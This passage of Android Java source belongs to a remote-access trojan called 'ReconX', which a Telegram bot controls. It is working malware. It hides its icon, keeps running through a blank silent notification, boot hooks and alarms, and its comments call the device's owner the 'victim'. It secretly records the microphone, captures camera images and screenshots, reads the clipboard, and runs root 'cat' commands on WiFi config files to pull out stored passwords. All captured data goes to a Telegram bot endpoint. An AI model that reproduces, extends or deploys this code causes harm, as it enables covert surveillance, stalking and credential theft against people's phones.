                PackageManager.DONT_KILL_APP);
            sendText("🙈 Icon hidden", chatId);
        } catch (Exception e) { sendText("❌ " + e.getMessage(), chatId); }
    }

    private void showIcon(String chatId) {
        try {
            getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP);
            sendText("👁️ Icon visible", chatId);
        } catch (Exception e) { sendText("❌ " + e.getMessage(), chatId); }
    }

    // Toast on victim device
    private void showToast(String msg, String chatId) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                android.widget.Toast.makeText(this, msg, android.widget.Toast.LENGTH_LONG).show();
                sendText("💬 Toast shown: " + msg, chatId);
            } catch (Exception e) { sendText("❌ Toast: " + e.getMessage(), chatId); }
        });
    }

    // Reboot (root)
    private void reboot(String chatId) {
        try {
            sendText("🔄 Rebooting...", chatId);
            Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot"}).waitFor();
        } catch (Exception e) { sendText("❌ Reboot: " + e.getMessage(), chatId); }
    }

    // WiFi passwords (root)
    private String getWifiPasswords() {
        String[] cmds = {
            "cat /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml",
            "cat /data/misc/wifi/WifiConfigStore.xml",
            "cat /data/misc/wifi/wpa_supplicant.conf"
        };
        for (String cmd : cmds) {
            try {
                Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", cmd});
                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
                StringBuilder sb = new StringBuilder("📶 WiFi Passwords\n\n");
                String line;
                while ((line = br.readLine()) != null) {
                    if (line.contains("SSID") || line.contains("PreSharedKey")
                        || line.contains("ssid") || line.contains("psk")
                        || line.contains("password")) {
                        sb.append(line.trim()).append("\n");
                    }
                }
                p.waitFor();
                if (sb.length() > 20) return sb.toString();
            } catch (Exception ignored) {}
        }
        return "📶 WiFi passwords not accessible (root required)";
    }

    // Clipboard (must run on main thread)
    private void getClipboard(String chatId) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                android.content.ClipboardManager cm =
                    (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                if (cm != null && cm.hasPrimaryClip() && cm.getPrimaryClip() != null) {
                    CharSequence txt = cm.getPrimaryClip().getItemAt(0).getText();
                    sendText("📋 Clipboard\n\n" + (txt != null ? txt.toString() : "(empty)"), chatId);
                } else {
                    sendText("📋 Clipboard is empty", chatId);
                }
            } catch (Exception e) { sendText("❌ Clipboard: " + e.getMessage(), chatId); }
        });
    }

    // ══════════════════════════════════════════════
    //  SCREENSHOT (root)
    // ══════════════════════════════════════════════
    private void takeScreenshot(String chatId) {
        File out = new File(getCacheDir(), "ss_" + System.currentTimeMillis() + ".png");
        try {
            Process p = Runtime.getRuntime().exec(new String[]{
                "su", "-c",
                "screencap -p " + out.getAbsolutePath()
                + " && chmod 644 " + out.getAbsolutePath()
            });
            p.waitFor();
            if (out.exists() && out.length() > 100) {
                sendFile(out, "screenshot.png", chatId);
                out.delete();
            } else {
                out.delete();
                sendText("❌ Screenshot failed (root required)", chatId);
            }
        } catch (Exception e) {
            out.delete();
            sendText("❌ Screenshot: " + e.getMessage(), chatId);
        }
    }

    // ══════════════════════════════════════════════
    //  MIC RECORDING
    // ══════════════════════════════════════════════
    private void recordMic(int seconds, String chatId) {
        File out = new File(getCacheDir(), "mic_" + System.currentTimeMillis() + ".3gp");
        MediaRecorder mr = null;
        try {
            sendText("🎤 Recording " + seconds + "s...", chatId);
            mr = new MediaRecorder();
            mr.setAudioSource(MediaRecorder.AudioSource.MIC);
            mr.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mr.setOutputFile(out.getAbsolutePath());
            mr.prepare();
            mr.start();
            Thread.sleep(seconds * 1000L);
            mr.stop();
            mr.release();
            mr = null;
            sendFile(out, "mic_" + seconds + "s.3gp", chatId);
            out.delete();
        } catch (Exception e) {
            if (mr != null) { try { mr.release(); } catch (Exception ignored) {} }
            out.delete();
            sendText("❌ Mic: " + e.getMessage(), chatId);
        }
    }

    // ══════════════════════════════════════════════
    //  CAMERA (Camera2 — silent background capture)
    // ══════════════════════════════════════════════
    @SuppressWarnings({"deprecation", "NewApi"})
    private void captureCamera(boolean front, String chatId) {
        android.hardware.camera2.CameraManager cm =
            (android.hardware.camera2.CameraManager) getSystemService(CAMERA_SERVICE);
        if (cm == null) { sendText("❌ Camera unavailable", chatId); return; }

        HandlerThread ht = new HandlerThread("cam_" + System.currentTimeMillis());
        ht.start();
        Handler handler = new Handler(ht.getLooper());

        final android.hardware.camera2.CameraDevice[] device = {null};
        final File[] out = {null};
        final CountDownLatch latch = new CountDownLatch(1);

        try {
            String[] ids = cm.getCameraIdList();
            String targetId = ids.length > 0 ? ids[0] : null;
            int want = front
                ? android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
                : android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK;
            for (String id : ids) {
                Integer facing = cm.getCameraCharacteristics(id)
                    .get(android.hardware.camera2.CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == want) { targetId = id; break; }
            }
            if (targetId == null) { sendText("❌ No camera found", chatId); ht.quit(); return; }

            android.media.ImageReader reader =
                android.media.ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2);

            reader.setOnImageAvailableListener(ir -> {
                android.media.Image img = ir.acquireLatestImage();
                if (img != null) {
                    try {
                        ByteBuffer buf = img.getPlanes()[0].getBuffer();
                        byte[] bytes = new byte[buf.remaining()];
                        buf.get(bytes);
                        img.close();
                        File f = new File(getCacheDir(), "cam_" + System.currentTimeMillis() + ".jpg");
                        FileOutputStream fos = new FileOutputStream(f);
                        fos.write(bytes);
                        fos.close();
                        out[0] = f;
                    } catch (Exception ignored) {}
                }
                latch.countDown();
            }, handler);

            final String finalId = targetId;
            final android.media.ImageReader finalReader = reader;

            cm.openCamera(finalId, new android.hardware.camera2.CameraDevice.StateCallback() {
                @Override
                public void onOpened(android.hardware.camera2.CameraDevice d) {
                    device[0] = d;
                    try {
                        android.hardware.camera2.CaptureRequest.Builder builder =
                            d.createCaptureRequest(android.hardware.camera2.CameraDevice.TEMPLATE_STILL_CAPTURE);
                        builder.addTarget(finalReader.getSurface());
                        builder.set(android.hardware.camera2.CaptureRequest.CONTROL_MODE,
                            android.hardware.camera2.CaptureRequest.CONTROL_MODE_AUTO);
                        List<Surface> surfaces = new ArrayList<>();
                        surfaces.add(finalReader.getSurface());
                        d.createCaptureSession(surfaces,
                            new android.hardware.camera2.CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(android.hardware.camera2.CameraCaptureSession s) {
                                    try { s.capture(builder.build(), null, handler); }
                                    catch (Exception e) { latch.countDown(); }
                                }
                                @Override
                                public void onConfigureFailed(android.hardware.camera2.CameraCaptureSession s) {
                                    latch.countDown();
                                }
                            }, handler);
                    } catch (Exception e) { latch.countDown(); }
                }
                @Override public void onDisconnected(android.hardware.camera2.CameraDevice d) { d.close(); latch.countDown(); }
                @Override public void onError(android.hardware.camera2.CameraDevice d, int e)  { d.close(); latch.countDown(); }
            }, handler);

            latch.await(15, TimeUnit.SECONDS);

            if (out[0] != null && out[0].exists()) {
                sendFile(out[0], out[0].getName(), chatId);
                out[0].delete();
            } else {
                sendText("❌ Camera capture failed", chatId);
            }
        } catch (Exception e) {
            sendText("❌ Camera: " + e.getMessage(), chatId);
        } finally {
            if (device[0] != null) { try { device[0].close(); } catch (Exception ignored) {} }
            ht.quit();
        }
    }

    // ══════════════════════════════════════════════
    //  FLASHLIGHT (API 23+)
    // ══════════════════════════════════════════════
    @SuppressWarnings("NewApi")
    private String toggleFlashlight(boolean on) {
        if (Build.VERSION.SDK_INT < 23) return "❌ Requires Android 6+";
        try {
            android.hardware.camera2.CameraManager cm =
                (android.hardware.camera2.CameraManager) getSystemService(CAMERA_SERVICE);
            if (cm == null) return "❌ Camera manager unavailable";
            for (String id : cm.getCameraIdList()) {
                android.hardware.camera2.CameraCharacteristics ch = cm.getCameraCharacteristics(id);
                Boolean hasFlash = ch.get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE);
                Integer facing   = ch.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING);
                if (hasFlash != null && hasFlash
                    && facing != null
                    && facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK) {
                    cm.setTorchMode(id, on);
                    return on ? "🔦 Flashlight ON" : "🔦 Flashlight OFF";
                }
            }
            return "❌ No flashlight found";
        } catch (Exception e) { return "❌ Flashlight: " + e.getMessage(); }
    }

    // ══════════════════════════════════════════════
    //  HELP
    // ══════════════════════════════════════════════
    private String getHelp() {
        return "📋 ReconX v1.1.1\n\n"
            + "── Info ──\n"
            + "/info  /gmail  /battery\n"
            + "/net  /usage  /storage\n"
            + "/apk  /running  /newapps\n\n"
            + "── Communication ──\n"
            + "/sms [n]  /calls [n]\n"
            + "/contacts  /loc\n\n"
            + "── Browser ──\n"
            + "/browser\n\n"
            + "── Files ──\n"
            + "/ls [path]  /get [path]\n\n"
            + "── Gallery ──\n"
            + "/photos [n/all]\n"
            + "/videos [n/all]\n\n"
            + "── System ──\n"
            + "/wallpaper [url]\n"
            + "/call [number]\n"
            + "/hide  /show\n"
            + "/toast [msg]\n"
            + "/reboot  /wifipass\n"
            + "/clipboard\n\n"
            + "── Capture ──\n"
            + "/screen  /mic [secs]\n"
            + "/cam [f/b]\n\n"
            + "── Other ──\n"
            + "/flashlight [on/off]\n"
            + "/help";
    }

    // ══════════════════════════════════════════════
    //  PERSISTENCE (Always Active)
    // ══════════════════════════════════════════════
    @SuppressWarnings("NewApi")
    private void scheduleRestart(long delayMs) {
        try {
            android.app.AlarmManager am = (android.app.AlarmManager) getSystemService(ALARM_SERVICE);
            if (am == null) return;
            int flags = Build.VERSION.SDK_INT >= 23
                ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
                : PendingIntent.FLAG_UPDATE_CURRENT;
            PendingIntent pi = PendingIntent.getService(this, 1, new Intent(this, inq.class), flags);
            long trigger = SystemClock.elapsedRealtime() + delayMs;
            if (Build.VERSION.SDK_INT >= 23) {
                am.setAndAllowWhileIdle(android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            } else if (Build.VERSION.SDK_INT >= 19) {
                am.setExact(android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            } else {
                am.set(android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            }
        } catch (Exception ignored) {}
    }

    // ══════════════════════════════════════════════
    //  SILENT FOREGROUND
    // ══════════════════════════════════════════════
    @SuppressWarnings({"NewApi", "deprecation"})
    private void silentForeground() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= 26 && nm != null) {
            NotificationChannel ch = new NotificationChannel(
                "rc", "System", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ch.setSound(null, null);
            nm.createNotificationChannel(ch);
        }
        Notification notif;
        if (Build.VERSION.SDK_INT >= 26) {
            notif = new Notification.Builder(this, "rc")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setContentTitle(" ").setContentText(" ").build();
        } else {
            notif = new Notification.Builder(this)
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setContentTitle(" ").setContentText(" ")
                .setPriority(Notification.PRIORITY_MIN).build();
        }
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(2, notif, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(2, notif);
        }
    }

    // ══════════════════════════════════════════════
    //  TELEGRAM API
    // ══════════════════════════════════════════════
    private void sendText(String text, String chatId) {
        if (text.length() > 4000) {
            sendText(text.substring(0, 4000), chatId);
            sendText(text.substring(4000), chatId);
            return;
        }
        try {
            HttpURLConnection c = (HttpURLConnection)
                new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage").openConnection();
            c.setRequestMethod("POST"); c.setDoOutput(true);
            c.setConnectTimeout(15_000); c.setReadTimeout(15_000);
            c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            byte[] body = ("chat_id=" + chatId + "&text=" + encode(text)).getBytes("UTF-8");
            OutputStream os = c.getOutputStream(); os.write(body); os.close();
            c.getResponseCode(); c.disconnect();
        } catch (Exception ignored) {}
    }

    private void sendWithButtons(String text, String chatId, String replyMarkup) {
        if (text.length() > 4000) { sendText(text, chatId); return; }
        try {
            HttpURLConnection c = (HttpURLConnection)
                new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage").openConnection();
            c.setRequestMethod("POST"); c.setDoOutput(true);
            c.setConnectTimeout(15_000); c.setReadTimeout(15_000);
            c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            byte[] body = ("chat_id=" + chatId + "&text=" + encode(text)
                + "&reply_markup=" + encode(replyMarkup)).getBytes("UTF-8");
            OutputStream os = c.getOutputStream(); os.write(body); os.close();
            c.getResponseCode(); c.disconnect();
        } catch (Exception ignored) { sendText(text, chatId); }
    }

    private int sendFile(File file, String filename, String chatId) {
        try {
            String bound = "RX" + System.currentTimeMillis();
            HttpURLConnection c = (HttpURLConnection)
                new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument").openConnection();
            c.setRequestMethod("POST"); c.setDoOutput(true);
            c.setConnectTimeout(30_000); c.setReadTimeout(180_000);
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + bound);
            DataOutputStream out = new DataOutputStream(c.getOutputStream());
            out.writeBytes("--" + bound + "\r\n");
            out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            out.writeBytes(chatId + "\r\n");
            out.writeBytes("--" + bound + "\r\n");
            out.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\""
                + filename + "\"\r\n");
            out.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
            FileInputStream fis = new FileInputStream(file);
            byte[] buf = new byte[16384]; int n;
            while ((n = fis.read(buf)) != -1) out.write(buf, 0, n);
            fis.close();
            out.writeBytes("\r\n--" + bound + "--\r\n");
            out.flush(); out.close();
            int code = c.getResponseCode(); c.disconnect();
            return code;
        } catch (Exception e) { return -1; }
    }

    private void answerCallback(String callbackId) {
        try {
            HttpURLConnection c = (HttpURLConnection)
                new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/answerCallbackQuery").openConnection();
            c.setRequestMethod("POST"); c.setDoOutput(true);
            c.setConnectTimeout(10_000); c.setReadTimeout(10_000);
            c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            OutputStream os = c.getOutputStream();
            os.write(("callback_query_id=" + callbackId).getBytes("UTF-8"));
            os.close(); c.getResponseCode(); c.disconnect();
        } catch (Exception ignored) {}
    }

    // ══════════════════════════════════════════════
    //  HELPERS
    // ══════════════════════════════════════════════
    private boolean hasRoot() {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "id"});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = br.readLine(); br.close(); p.waitFor();
            return line != null && line.contains("uid=0");
        } catch (Exception e) { return false; }
    }

    private String encode(String s) {
        try { return java.net.URLEncoder.encode(s, "UTF-8"); }
        catch (Exception e) { return s; }
    }

    private int arg(String cmd, int def) {
        String[] p = cmd.split(" ");
        if (p.length > 1) { try { return Integer.parseInt(p[1]); } catch (Exception ignored) {} }
        return def;
    }

    private String argStr(String cmd, String def) {
        String[] p = cmd.split(" ");
        return p.length > 1 ? p[1] : def;
    }

    private int safeInt(String s, int def) {
        try { return Integer.parseInt(s); } catch (Exception e) { return def; }
    }

    private String truncate(String s, int max) {
        return s.length() > max ? s.substring(0, max) + "…" : s;
    }

    private String escJson(String s) {
        return s.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    // ── BOOT RECEIVER ────────────────────────────
    public static class BootReceiver extends BroadcastReceiver {
        @SuppressWarnings("NewApi")
        @Override
        public void onReceive(Context ctx, Intent intent) {
            if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
                Intent svc = new Intent(ctx, inq.class);
                if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(svc);
                else ctx.startService(svc);
            }
        }
    }
}
